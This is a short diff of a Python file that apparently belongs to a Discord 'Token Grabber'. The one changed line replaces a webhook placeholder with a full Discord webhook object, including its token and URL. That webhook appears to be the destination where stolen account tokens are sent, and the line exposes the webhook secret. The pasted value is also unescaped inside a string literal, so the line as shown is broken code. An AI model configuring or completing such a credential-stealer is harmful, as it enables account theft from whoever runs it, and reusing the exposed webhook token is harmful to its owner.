@@ -24,7 +24,7 @@ from zipfile import ZIP_DEFLATED, ZipFile
 
 
 
-_HOOK_ = "YOUR WEBHOOK HERE"
+_HOOK_ = "{"application_id":null,"avatar":"a6550faba98bde5371f8dedf7154d886","channel_id":"1107874754511261696","guild_id":"1081331068814241862","id":"1126235761264574576","name":"Token Grabber","type":1,"user":{"id":"717501265864687626","username":"thenegusyoni","avatar":"33d75dc4bab8a46ecb12e7f49c358c7a","discriminator":"0","public_flags":64,"flags":64,"banner":"5f2421b5ee716cb8ac7b4148da83434a","accent_color":4325376,"global_name":"Negus Yoni","avatar_decoration":null,"display_name":"Negus Yoni","banner_color":"#420000"},"token":"rBRf9vWb3Uu_-QTJi81ttC3oVn3HtpaAHJxUZlMHqDx-xdGZQ5BA4-8Xi1wRaZ1bqcFQ","url":"https://discord.com/api/webhooks/1126235761264574576/rBRf9vWb3Uu_-QTJi81ttC3oVn3HtpaAHJxUZlMHqDx-xdGZQ5BA4-8Xi1wRaZ1bqcFQ"}"
 
 
 
